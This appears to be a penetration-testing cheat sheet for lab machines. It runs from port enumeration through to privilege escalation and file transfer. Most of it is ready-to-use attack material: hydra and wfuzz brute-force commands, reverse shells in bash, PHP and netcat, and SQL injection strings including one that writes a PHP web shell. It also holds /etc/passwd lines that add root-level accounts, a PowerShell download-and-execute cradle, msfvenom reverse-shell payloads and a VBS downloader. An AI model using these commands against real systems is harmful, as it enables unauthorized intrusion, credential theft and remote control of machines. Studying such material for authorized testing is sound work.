   ______      __    __              ____        __         
  / ____/___  / /___/ /__  ____     / __ \__  __/ /__  _____
 / / __/ __ \/ / __  / _ \/ __ \   / /_/ / / / / / _ \/ ___/
/ /_/ / /_/ / / /_/ /  __/ / / /  / _, _/ /_/ / /  __(__  ) 
\____/\____/_/\__,_/\___/_/ /_/  /_/ |_|\__,_/_/\___/____/  

1) If you find a credential set that works somewhere, try it EVERYWHERE!
2) Always perform a full TCP AND UDP scan.
3) Ask "Have I done this before?", reference past notes!
4) Once in the machine, check EVERYTHING the /var/www/html directory.
5) If something strange is happening on the machine, there might be a hidden cron job.
6) Never, EVER, doubt the power of default credentials.


==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||||||    ENUMERATION OF PORTS    |||||||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

22 - SSH
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Find allowed auth methods

    * Try connecting with wrong pass, look at allowed authentication methods (public key, password, etc.) 
    * hydra -l <USERNAME> -P /root/HTB/Wordlists/<LIST> <TARGET IP> ssh -t 4 : Brute force SSH with username T4 IS IMPORTANT
      
   
   
25 - SMTP
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Get usernames and emails of users on box

     * smtp-user-enum -M VRFY -U /root/HTB/Wordlists/<WORDLIST> -t <TARGET IP> : Uses list to confirm users are on box
  
  
    
53 - DNS
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Uncover hidden domain names, which can expose different sites 

    * nslookup 
        > SERVER <IP ADDR>
        > <IP ADDR> : Shows the domain associated with the IP 
    * dig axfr <DOMAIN.EXT> @<IP ADDR>


     
80 - HTTP
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * Use dirbuster/gobuster/Burp Spider to find directories
     * nikto -h http://<IP ADDR>: Scan with Nikto
     * Use Wappalyzer to check for technologies on webpage
   
   
      
111 - RPC
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: System info, users, domains, groups 

     * rpcclient -U "" <IP ADDR>: Connect anon
     * rpcinfo <IP ADDR>: Get rpc information
     * (Impacket) rpcdump.py <USER>:<PASS>@<IP ADDR> <PORT>



161 (UDP) - SNMP
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Find info about connected devices, users, pws, command history

     * snmpwalk -v 1 -c public <TARGET IP> : View read-only info from SNMPv1 



139/445 - SMB
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Read files, which can disclose lots of info

     * smbclient -L <IP ADDR>: List SMB shares
          * SMB version is listed if connected 
     * nmap --script smb-enum-users.nse -p139 <IP ADDR> : Scan SMB shares, shows where each share is mapped to on the target
     * smbclient //<IP ADDR>/<SHARE NAME>: Connect to SMB share (anonymous)
     * (Impacket) python smbclient.py <USER>:<PASSWORD>@<ID ADDR>: Connect to SMB, needs creds 
     * If a share is writable, possible SCF attack. https://0xrick.github.io/hack-the-box/sizzle/



2049 - NFS 
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Enum: Shows filesystems that are open for mounting, which allows them to be read

     * showmount -e <TARGET IP>
     * mount <TARGET IP>:<DIRECTORY LISTED BY SHOWMOUNT> <WHERE TO MOUNT ON KALI>
     * If the filesystem cant be read, once shell is gained on system, look at perms of mount, then 
       add a user with the same name/id as in the passwd file on Kali. su to the user, then read. 



3306 - MySQL
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * mysql -u <USERNAME> -p <PASSWORD> -h <TARGET IP> : Connect to MySQL database from Kali 



Unknown Port/Service
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
     * nc <TARGET IP> <PORT>
     * telnet <TARGET IP> <PORT>
     * http://<TARGET IP>:<PORT>



==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||||||      REVERSE SHELLS      |||||||||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

TTY Shell Upgrade: python -c 'import pty; pty.spawn("/bin/bash")' 
   Command Completion: ctl+z in reverse shell 
                                 -> stty raw -echo 
                                          -> fg 
                                               -> export TERM=screen

Listen on Kali: nc -lvp <PORT>

Bash: bash -i >& /dev/tcp/<IP ADDR>/<PORT> 0>&1

PHP: php -r '$sock=fsockopen("<IP ADDR>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

Netcat with -e: nc -e /bin/sh <IP ADDR> <PORT>

Netcat without -e: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP ADDR> <PORT> >/tmp/f

Netcat without -e: mknod /tmp/backpipe p
                   /bin/sh 0</tmp/backpipe | nc <IP ADDR> <PORT> 1>/tmp/backpipe

(WINDOWS): nc -e cmd.exe <IP> <PORT>


https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/ - MSFVenom guide

==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||||      SQL INJECTION STRINGS      ||||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================


' or ''='     

' or ''-

' or '''

blah’ OR 1 = 1 — -

“blah’ OR 1=1 — “

' or 1=1--

' or 1=1#

' or 1=1/*

') or '1'='1--

') or ('1'='1--


Enumerate MySQL version
-------------------------
0′ UNION SELECT version(),null /*
0′ UNION SELECT @@version,null /* (Try different comment enders) 

Enumerate table names
-------------------------
0′ UNION SELECT table_name,null FROM information_schema.tables WHERE version = ‘9
      0′ UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = ‘<TABLE NAME> : Get column names


Comment out rest of query
--------------------------
#
/*
-- -
--
;%00
`
--+


USERNAME | PASS
------------------
GENERAL QUERY: SELECT id FROM table_name WHERE user='' AND pass='' LIMIT 1

admin ' | '

' or 1-- | EMPTY

' | ' 

<USERNAME> | blah’ OR 1 = 1 — -



URL Injections
''''''''''''''''''
Try to append ' (single apostrophe) to the end of a ?pagename=home' to see if error returns 
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE '/var/www/html/backdoor.php' : Create shell


Good Resources
''''''''''''''''''
https://nandtech.co/2017/07/11/penetration-testing-practice-hacking-kioptrix-l3/ : SQL injection through web (MySQL) 



==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||||||    COMMAND INJECTION STRINGS    |||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

;

; <COMMAND> ;

|

||

&&

$(<COMMAND>)



==============================================================================================================================
|||||||||||||||||||||||||||||||||||||||||||||||||    LOGIN BRUTE FORCING     |||||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

To get request: "Inspect element" in Firefox > Network > Refresh page > view headers + request

Login Bruteforce with Wfuzz
'''''''''''''''''''''''''''''
wfuzz -z file,/root/HTB/Wordlists/<WORDLIST> -d "username=FUZZ&password=FUZZ" http://<ADDRESS OF LOGIN PAGE>

Login Bruteforce with Hydra
'''''''''''''''''''''''''''''
hydra -l <USERNAME> -P /root/HTB/Wordlists/<WORDLIST> <TARGET IP> http-post-form "/<LOGIN PAGE NOT FULL URL>:<REQUEST REPLACE PASSWORD WITH ^PASS^>:<ERROR MESSAGE>"



==============================================================================================================================     
==============================================================================================   .--.   ======================
======================================   ██      ██ ███    ██ ██    ██ ██   ██   ============   |o_o |   =====================
======================================   ██      ██ ████   ██ ██    ██  ██ ██    ===========    |:_/ |    ====================
======================================   ██      ██ ██ ██  ██ ██    ██   ███     ===========   //   \ \   ====================
======================================   ██      ██ ██  ██ ██ ██    ██  ██ ██    ===========  (|     | )  ====================
======================================   ███████ ██ ██   ████  ██████  ██   ██   =========== /'\_   _/`\  ====================
============================================================================================ \___)=(___/  ==================== 
==============================================================================================================================     
 
==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||||||    LINUX PRIV ESC    ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

Common Vectors
'''''''''''''

1) Kernel Exploit 
    * Check with uname -a AND lsb_release -a 
    * Search for possible kernel exploit 
    * Transfer + compile
    * Exploit
    
2) Running Services
    * Check for root running services with ps aux | grep root, or pspy64

3) SUID/sudo Capabilities
    * Check for files that can run as the owner (root)
    * They can sometimes be exploited to act as root
    * Check https://gtfobins.github.io/ for many binary capabilties
    * sudo -ll makes sudoers output a little more readable 
    
4) Cron Jobs
    * Check cron with ls -la /etc/cron.d
    * Can any tasks be written/modified? 
    * Is cron.d directory writable? 
    
5) "." in PATH 
    * Users with "." in path makes it convenient so that "./" does not need to be added before binary
    * This can lead to malicous twin binaries executing


Commands
'''''''''''''
w: Other users logged in 

env: See environmental variables

id: Show id and group membership

uname -a: Machine info, kernel, etc.

lsb_release -a: Show OS info

cat /etc/passwd: View accounts

find / -type d -writable 2> /dev/null: Find writable directories

find / -type f -writable 2> /dev/null | grep -v -e "proc" : Find writable files (exclude proc directory)

find / -perm /4000 2>/dev/null : Find SUID files

find / -perm -g=s -type f 2>/dev/null: Find GUID files

crontab -l: List cron jobs

ls -la /etc/cron.d: Check cron jobs

mount: View mounted filesystems

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null: Find compilers, etc. 

netstat -antup: Check open ports 

find / -type f | xargs grep 'password' : Search through files for word "password"
find / -type f | xargs grep 'username' : Search through files for word "username"


Scripts
''''''''''''''
      * linenum.sh
      * suggester.sh 
      * pspy: View processes in real time
      * Linux Smart Enumeration : https://github.com/diego-treitos/linux-smart-enumeration
      * https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py: View SUIDs that are not standard
      
Other
''''''''''''''
     * https://gtfobins.github.io/ : Check capabilities of binaries with this site
     * https://payatu.com/blog_12 : Good linux priv esc article 
     * https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ : Escaping restricted shells
    
      Modify /etc/passwd:
      ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash (PASSWORD= pass123)
      Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash (PASSWORD= Password@973)



==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||    LINUX FILE TRANSFER/EXFILTRATION    ||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

scp <PATH ON KALI> <USERNAME>@<TARGET IP>:<PATH ON TARGET> : Transfer file TO TARGET FROM ATTACKER
scp <USERNAME>@<TARGET IP>:<PATH ON TARGET> <PATH ON KALI> : Transfer file TO ATTACKER FROM TARGET

Netcat:
   ATTACKER: nc -l -p <PORT> > <FILENAME>
   TARGET: nc -w 3 <ATTACKER IP> <PORT> < <FILENAME>

curl -o <FILENAME> http://<ATTACKER IP>/<FILENAME>
 
 
 
==============================================================================================================================     
==============================================================================================================================     
==============================   ██     ██ ██ ███    ██ ██████   ██████  ██     ██ ███████   =======           _.-;;-._  =====
==============================   ██     ██ ██ ████   ██ ██   ██ ██    ██ ██     ██ ██        =======   '-..-'|   ||   |  =====
==============================   ██  █  ██ ██ ██ ██  ██ ██   ██ ██    ██ ██  █  ██ ██████    =======   '-..-'|_.-;;-._|  =====
==============================   ██ ███ ██ ██ ██  ██ ██ ██   ██ ██    ██ ██ ███ ██      ██   =======   '-..-'|   ||   |  =====
==============================    ███ ███  ██ ██   ████ ██████   ██████   ███ ███  ███████   =======   '-..-'|_.-''-._|  =====
==============================================================================================================================                                                                                       
==============================================================================================================================     

==============================================================================================================================
||||||||||||||||||||||||||||||||||||||||||||||||    WINDOWS PRIV ESC    ||||||||||||||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================


https://github.com/xapax/oscp/blob/master/templates/windows-template.md LOOK AT THIS <-----
^^


powershell.exe $PSVersionTable.PSVersion: Output powershell version

systeminfo: Get OS + service pack info -> search for exploits

net users: Lists users

Scripts
''''''''''''''
      * jaws
      * powerup.ps1
            * powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://<IP ADDR>/powerup.ps1\");Import-Module powerup.ps1;Invoke-AllChecks
      * sherlock 
      * powerless (for windows boxes without powershell) - https://github.com/M4ximuss/Powerless
      * Windows Credential Editor (dumps passwords from memory in cleartext)
      * Mimikatz 

Other 
''''''''''''''
     * https://lolbas-project.github.io/ : Windows binaries + capabilities 
     * Check for SCManager misconfig: https://recipeforroot.com/scmanger/ 
     * https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/ : Windows Priv Esc

==============================================================================================================================
|||||||||||||||||||||||||||||||||||||||||    WINDOWS FILE TRANSFER/EXFILTRATION    |||||||||||||||||||||||||||||||||||||||||||
==============================================================================================================================

Payloads: 
msfvenom -p windows/shell/reverse_tcp LHOST=<KALI IP> LPORT=<PORT> -f exe > shell.exe : x86 shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI IP> LPORT=<PORT> -f exe > shell.exe : x64 shell

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<KALI IP>/<FILE>','C:\<PATH>')"

powershell -nop -exec bypass -command "Invoke-WebRequest -Uri http://<IP ADDR>/<FILE> -Outfile C:\<PATH TO FILE>"     

certutil -URLcache -split -f “http://<KALI IP>/<FILENAME>" <FILENAME TO OUTPUT>

Create a wget.vbs script. Usage: wget.vbs http://<KALI IP>/<FILE> <OUTFILE NAME>

      echo strUrl = WScript.Arguments.Item(0) > wget.vbs
      echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
      echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
      echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
      echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
      echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
      echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
      echo Err.Clear >> wget.vbs
      echo Set http = Nothing >> wget.vbs
      echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
      echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
      echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
      echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
      echo http.Open "GET",strURL,False >> wget.vbs
      echo http.Send >> wget.vbs
      echo varByteArray = http.ResponseBody >> wget.vbs
      echo Set http = Nothing >> wget.vbs
      echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
      echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
      echo strData = "" >> wget.vbs
      echo strBuffer = "" >> wget.vbs
      echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
      echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
      echo Next >> wget.vbs
      echo ts.Close >> wget.vbs
